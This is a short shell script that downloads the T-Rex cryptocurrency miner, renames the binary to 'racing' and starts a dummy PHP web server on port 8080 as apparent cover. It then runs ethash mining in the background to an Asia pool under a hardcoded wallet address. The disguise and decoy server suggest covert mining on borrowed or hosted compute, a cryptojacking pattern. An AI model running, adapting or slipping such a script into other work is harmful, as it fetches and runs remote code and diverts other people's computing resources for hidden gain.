cd /home
FILE=index.php
if [ ! -f "$FILE" ];
then
  distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
  wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
  apt-get update
  wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
  tar xvzf t-rex-0.21.6-linux.tar.gz
  mv t-rex racing
  touch index.php
  php -S 0.0.0.0:8080 &
  /home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -p x -w az00 &
else
  echo "$FILE file exists."
fi
